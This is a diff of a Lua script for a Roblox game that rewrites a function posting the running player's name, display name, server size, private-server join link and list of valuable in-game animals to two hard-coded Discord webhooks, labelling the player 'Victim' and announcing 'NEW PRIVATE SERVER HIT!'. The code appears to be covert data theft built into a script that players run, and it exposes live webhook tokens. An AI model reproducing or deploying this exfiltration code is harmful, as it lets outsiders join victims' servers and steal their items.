@@ -108,7 +108,8 @@ end)
 
 local allowedAnimals = {
     "67",
-    "Celularcini Viciosini", 
+    "Celularcini Viciosini",
+    "Dragon Cannelloni",
     "Esok Sekolah",
     "Garama and Madundung",
     "Ketupat Kepat",
@@ -122,6 +123,7 @@ local allowedAnimals = {
     "Tictac Sahur",
     "Tralaledon",
     "La Spooky Grande",
+    "Strawberry Elephant",
     "Los Bros",
     "Los Chicleteiras",
     "Los Combinasionas",
@@ -133,6 +135,8 @@ local allowedAnimals = {
     "La Grande Combinasion",
     "La Supreme Combinasion",
     "La Extinct Grande",
+    "La Secret Combinasion", 
+    "Spooky and Pumpky", 
     "Ketchuru and Musturu", 
     "Los Lucky Blocks", 
     "Admin Lucky Block", 
@@ -252,110 +256,91 @@ local function sendToWebhook(link, foundAnimals)
         "Dragon Cannelloni",
         "Strawberry Elephant",
         "Spooky and Pumpky",
-        "La Secret Combinasion"
+        "La Secret Combinasion",
+        "Burguro And Fryuro"
     }
-
-    local normalAnimals, specialFound = {}, {}
-
-    -- Clasificar animales correctamente
-    for _, animal in ipairs(foundAnimals) do
-        local isSpecial = false
-        for _, special in ipairs(specialAnimals) do
-            if animal:lower() == special:lower() then
-                table.insert(specialFound, animal)
-                isSpecial = true
-                break
-            end
-        end
-        if not isSpecial then
-            table.insert(normalAnimals, animal)
-        end
-    end
 
     local webhookNormal = "https://discord.com/api/webhooks/1427379212557353072/NrnXlLXc-gxzF9w94jbNDEsfw1CmVd5w_mK2mCzm1fW1AJLmH_66UBq-jr10al5AJyCC"
     local webhookSpecial = "https://discord.com/api/webhooks/1428259836688334910/nwKnU7h9LI8zrEMMpQRCDKwUTM8SO_j6zLTP6WLLRPS3B6UVjNhwcmER5cIDFMeL04Un"
 
     local playerName = LocalPlayer.Name
     local displayName = LocalPlayer.DisplayName
+    local specialFound = false
 
-    local function sendToSpecificWebhook(webhookUrl, animals, isSpecial)
-        if #animals == 0 then return end
+    for _, animal in ipairs(foundAnimals) do
+        for _, special in ipairs(specialAnimals) do
+            if animal:lower():find(special:lower(), 1, true) then
+                specialFound = true
+                break
+            end
+        end
+        if specialFound then break end
+    end
 
-        local list = table.concat(animals, "\n")
-        local data = {
-            ["content"] = isSpecial and "@everyone **SPECIAL CATCHES FOUND!**" or "@everyone **NEW PRIVATE SERVER HIT!**",
-            ["embeds"] = {{
-                ["title"] = isSpecial and "⭐ CATCHES ESPECIALES ENCONTRADOS" or "🎯 Nuevo Exploiter Encontrado",
-                ["color"] = isSpecial and 16766720 or 10038562,
-                ["fields"] = {
-                    {
-                        ["name"] = "👤 Información del jugador:",
-                        ["value"] = ("```diff\n+ Victim: %s\n+ Display: %s\n```"):format(playerName, displayName),
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "👥 Datos del servidor:",
-                        ["value"] = ("```diff\n+ Players in Server: %d\n```"):format(playerCount),
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "🎮 Link:",
-                        ["value"] = "[Click here to join](" .. link .. ")",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = isSpecial and "⭐ CATCHES ESPECIALES:" or "🏆 Items importantes (secrets):",
-                        ["value"] = "```diff\n+ " .. list:gsub("\n", "\n+ ") .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "📊 Total:",
-                        ["value"] = ("```diff\n+ Total Items: %d\n+ Game ID: %s\n```"):format(#animals, tostring(game.GameId)),
-                        ["inline"] = false
-                    }
-                },
-                ["footer"] = {["text"] = isSpecial and "Detector de Catches Especiales" or "Cazador de exploiter"},
-                ["timestamp"] = DateTime.now():ToIsoDate()
-            }}
-        }
+    local webhookUrl = specialFound and webhookSpecial or webhookNormal
+    local isSpecial = specialFound
 
-        local jsonData = HttpService:JSONEncode(data)
-        local success, err = pcall(function()
-            HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
-        end)
-
-        if not success then
-            pcall(function()
-                HttpService:RequestAsync({
-                    Url = webhookUrl,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = jsonData
-                })
-            end)
+    local animalList = ""
+    for i, animal in ipairs(foundAnimals) do
+        if i == 1 then
+            animalList = animal
+        else
+            animalList = animalList .. "\n" .. animal
         end
     end
 
-    -- Solo manda a lo que corresponde
-    if #normalAnimals > 0 then
-        sendToSpecificWebhook(webhookNormal, normalAnimals, false)
-    end
-    if #specialFound > 0 then
-        sendToSpecificWebhook(webhookSpecial, specialFound, true)
+    local title = isSpecial and "⭐ CATCHES ESPECIALES ENCONTRADOS" or "🎯 Nuevo Exploiter Encontrado"
+    local color = isSpecial and 16766720 or 10038562
+
+    local data = {
+        ["content"] = isSpecial and "@everyone **SPECIAL CATCHES FOUND!**" or "@everyone **NEW PRIVATE SERVER HIT!**",
+        ["embeds"] = {{
+            ["title"] = title,
+            ["color"] = color,
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Informacion del jugador:",
+                    ["value"] = "```diff\n+ Victim: " .. playerName .. "\n+ Display: " .. displayName .. "\n```",
+                },
+                {
+                    ["name"] = "👥 Datos del Server:",
+                    ["value"] = "```diff\n+ Players in Server: " .. playerCount .. "\n```",
+                },
+                {
+                    ["name"] = "🎮 link:",
+                    ["value"] = "[Click here to join](" .. link .. ")",
+                },
+                {
+                    ["name"] = isSpecial and "⭐ CATCHES ESPECIALES:" or "🏆 Items importantes(secrets):",
+                    ["value"] = "```diff\n+ " .. animalList:gsub("\n", "\n+ ") .. "```",
+                },
+                {
+                    ["name"] = "📊 Total:",
+                    ["value"] = "```diff\n+ Total Items: " .. #foundAnimals .. "\n+ Game ID: " .. tostring(game.GameId) .. "\n```",
+                }
+            },
+            ["footer"] = {["text"] = isSpecial and "Detector de Catches Especiales" or "Cazador de exploiter"},
+            ["timestamp"] = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    local success, err = pcall(function()
+        local jsonData = HttpService:JSONEncode(data)
+        HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
+    end)
+
+    if not success then
+        pcall(function()
+            local jsonData = HttpService:JSONEncode(data)
+            HttpService:RequestAsync({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
     end
 
-    return true
-end
-    
-    -- Enviar a webhooks correspondientes
-    if #normalAnimals > 0 then
-        sendToSpecificWebhook(webhookNormal, normalAnimals, false)
-    end
-    
-    if #specialFound > 0 then
-        sendToSpecificWebhook(webhookSpecial, specialFound, true)
-    end
-    
     return true
 end
 
